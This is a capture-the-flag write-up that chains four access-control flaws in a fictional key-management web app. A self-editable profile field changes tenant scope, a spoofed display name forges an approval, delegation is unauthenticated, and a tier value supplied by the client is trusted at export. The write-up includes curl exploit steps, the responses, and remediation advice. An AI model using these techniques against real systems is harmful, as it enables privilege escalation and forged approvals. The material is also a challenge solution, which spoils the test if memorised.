### Operation Dawn: The Relay Tap

> [fill in] · [fill in] · [fill in]
> Points at solve: [fill in]

**Tools used**

curl

**Approach**

Relay Desk (Kestrel Signals) trusts three mutable, client-controlled fields at three different privilege boundaries. Chaining them let a plain BR-14 analyst:

1. switch their tenant scope to the Theatre Relay Authority (KL-01),
2. sign off a KL-01 rotation under a spoofed officer display name and delegate the second signature to a real officer, and
3. export the sealed bundle at a **higher tier than authorized** (`master` instead of `theater`), yielding the theatre master bundle's authorization code.

Target instance: `<instance>` (account `a.reyes` / password `<redacted>`, role: analyst, home unit BR-14).

1. Tenant scope hijack via `duty_assignment`. `PATCH /api/profile` accepts any `duty_assignment` with no check that the account actually holds that posting. `POST /api/profile/refresh` then rebuilds the `rdsession` cookie from it.

```bash
curl -s -b jar.txt -c jar.txt -X PATCH .../api/profile \
  -H 'Content-Type: application/json' -d '{"duty_assignment":"KL-01"}'
curl -s -b jar.txt -c jar.txt -X POST .../api/profile/refresh
```

Result: `scope` becomes `KL-01`. `/api/units/KL-01/staff`, `/api/rotations` and `/api/bundles` now return the relay authority's data — including the KL-01 rotations whose `authorized_tier` is `theater`.

2. Approval authorization trusts `display_name`. `POST /api/rotations/{ref}/approve` records a sign-off "under the acting officer's signatory display name" and authorizes based on that name, not on the account id or role. Patching the profile display name to the name of an authorized approver on the rotation (`Maj. R. Castellan`) plus a refresh makes the analyst pass the check. (`A. Reyes` was rejected with `You are not an authorized approver for this rotation.`)

```bash
curl -X PATCH .../api/profile -d '{"display_name":"Maj. R. Castellan"}'
curl -X POST  .../api/profile/refresh
curl -X POST  .../api/rotations/rr_S0wtMDE6MTA.96cc36ad984a53de/approve -d '{}'
# -> approvals: [{display_name:"Maj. R. Castellan", via:"approve", ...}]
```

3. Delegated second signature to an arbitrary account. `POST .../delegate-approval {"delegate_id": ...}` never verifies the caller is allowed to delegate; it records an approval attributed to any account id. The second approval moves the rotation to `approved`.

```bash
curl -X POST .../api/rotations/rr_S0wtMDE6MTA.96cc36ad984a53de/delegate-approval \
  -H 'Content-Type: application/json' -d '{"delegate_id":"usr_okonkwo"}'
# -> status: approved, [Castellan/approve, Okonkwo/delegate]
```

4. Tier escalation at export. The rotation is authorized only for `theater`, but `POST .../export {"tier":...}` seals at whatever tier the caller names. Requesting `master` produces the theatre master bundle (`custody: "theatre"`) and returns the authorization code.

```bash
curl -X POST .../api/rotations/rr_S0wtMDE6MTA.96cc36ad984a53de/export \
  -H 'Content-Type: application/json' -d '{"tier":"master"}'
```

Response:

```json
{
  "bundle": {
    "bundle_id": "SEAL-225B7E0261",
    "tier": "master",
    "custody": "theatre",
    "unit": "KL-01",
    "crypto_period": "DAWN-KILO-10",
    "key_fingerprint": "4c:13:6d:77:4c:df",
    "authorization_code": "CSCTF{REDACTED}"
  }
}
```

**Why it works**

Every privilege boundary re-derives trust from client-editable profile fields instead of server-side authorization state: tenant scope comes from a self-declared `duty_assignment`, approval authority from a mutable `display_name`, delegation is unauthenticated, and the export tier is taken from the request rather than from `rotation.authorized_tier`. Chaining the four flaws lets a low-privilege analyst act inside KL-01, satisfy dual control with forged and delegated signatures, and self-authorize a higher-tier export.

Remediation:
- Validate `duty_assignment` against the account's actual postings; never derive tenant scope from a self-editable field.
- Bind approvals to immutable `account_id` + assignment/role, not to a mutable `display_name`.
- Require the delegator to hold delegation rights for the target account.
- Enforce `requested_tier <= rotation.authorized_tier` server-side; treat tier as an enum with an explicit rank, not a free string.

**Validation**

The `export` call returned the theatre master bundle containing `authorization_code` `CSCTF{REDACTED}` (in the JSON response shown above), confirming a higher-tier bundle than the rotation was authorized for was issued.
